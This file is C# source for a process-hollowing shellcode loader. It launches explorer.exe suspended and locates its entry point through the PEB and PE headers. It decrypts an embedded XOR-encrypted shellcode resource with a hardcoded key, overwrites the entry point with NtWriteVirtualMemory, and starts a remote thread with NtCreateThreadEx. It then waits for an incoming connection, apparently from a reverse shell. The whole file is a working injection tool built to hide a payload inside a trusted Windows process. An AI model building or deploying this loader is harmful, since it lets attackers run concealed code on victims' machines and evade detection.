using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace Hollow
{
    internal class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle;
            public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize;
            public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute;
            public uint dwFlags; public ushort wShowWindow; public ushort cbReserved2;
            public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus; public IntPtr PebBaseAddress; public IntPtr AffinityMask;
            public IntPtr BasePriority; public UIntPtr UniqueProcessId; public IntPtr InheritedFromUniqueProcessId;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpAppName, string lpCmdLine, IntPtr lpProcAttr, IntPtr lpThreadAttr, bool bInherit, uint dwFlags, IntPtr lpEnv, string lpDir, [In] ref STARTUPINFO lpSi, out PROCESS_INFORMATION lpPi);

        [DllImport("ntdll.dll")]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInfoClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint tmp);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("ntdll.dll")]
        public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("ntdll.dll")]
        public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, ref uint NumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll")]
        public static extern uint NtCreateThreadEx(
            out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes,
            IntPtr processHandle, IntPtr startAddress, IntPtr parameter,
            bool createSuspended, uint stackZeroBits, uint sizeOfStack,
            uint sizeOfMaximumStack, IntPtr attributeList);

        public static byte[] DecryptXOR(byte[] data, byte[] key)
        {
            byte[] decrypted = new byte[data.Length];
            for (int i = 0; i < data.Length; i++) decrypted[i] = (byte)(data[i] ^ key[i % key.Length]);
            return decrypted;
        }

        static byte[] LoadShellcode()
        {
            var assembly = Assembly.GetExecutingAssembly();

            // Uncomment to debug resource name if null exception:
            // foreach (var n in assembly.GetManifestResourceNames()) Console.WriteLine(n);

            using (var stream = assembly.GetManifestResourceStream("shellcode_enc.bin"))
            using (var ms = new MemoryStream())
            {
                if (stream == null)
                    throw new Exception("[!] shellcode_enc.bin not found as embedded resource. Check resource name above.");
                stream.CopyTo(ms);
                return ms.ToArray();
            }
        }

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            CreateProcess(null, "C:\\Windows\\explorer.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            ZwQueryInformationProcess(pi.hProcess, 0, ref bi, (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(pi.hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(pi.hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
            uint entryPointRVA = BitConverter.ToUInt32(data, (int)e_lfanew + 0x28);
            IntPtr entryPointAddr = (IntPtr)(entryPointRVA + (Int64)svchostBase);

            byte[] encryptedData = LoadShellcode();
            byte[] key = Encoding.ASCII.GetBytes("HFDG*febMXL@uX8YkkPhJof*");
            byte[] buf = DecryptXOR(encryptedData, key);
            Console.WriteLine("[*] Shellcode size: " + buf.Length);
            Console.WriteLine("[*] First 4 decrypted bytes: {0:X2} {1:X2} {2:X2} {3:X2}", buf[0], buf[1], buf[2], buf[3]);

            IntPtr baseAddrToProtect = entryPointAddr;
            IntPtr sizeToProtect = (IntPtr)buf.Length;
            uint oldProtect = 0;
            uint bytesWritten = 0;

            NtProtectVirtualMemory(pi.hProcess, ref baseAddrToProtect, ref sizeToProtect, 0x04, out oldProtect);
            uint ntStatus = NtWriteVirtualMemory(pi.hProcess, entryPointAddr, buf, (uint)buf.Length, ref bytesWritten);
            if (ntStatus == 0) Console.WriteLine("[+] NtWriteVirtualMemory OK.");

            uint tempProtect = 0;
            NtProtectVirtualMemory(pi.hProcess, ref baseAddrToProtect, ref sizeToProtect, oldProtect, out tempProtect);

            if (bytesWritten != (uint)buf.Length)
                Console.WriteLine("[!] Incomplete write!");

            byte[] verifyBuf = new byte[buf.Length];
            ReadProcessMemory(pi.hProcess, entryPointAddr, verifyBuf, verifyBuf.Length, out nRead);

            if (Convert.ToBase64String(buf) == Convert.ToBase64String(verifyBuf))
                Console.WriteLine("[+] Memory verified.");
            else
                Console.WriteLine("[!] Memory mismatch!");

            IntPtr hRemoteThread = IntPtr.Zero;
            uint ntStatusThread = NtCreateThreadEx(
                out hRemoteThread, 0x1FFFFF, IntPtr.Zero,
                pi.hProcess, entryPointAddr, IntPtr.Zero,
                false, 0, 0, 0, IntPtr.Zero);

            if (ntStatusThread == 0)
                Console.WriteLine("[+] Thread fired via NtCreateThreadEx.");

            Console.WriteLine("[*] Waiting for connection...");
            System.Threading.Thread.Sleep(-1);
        }
    }
}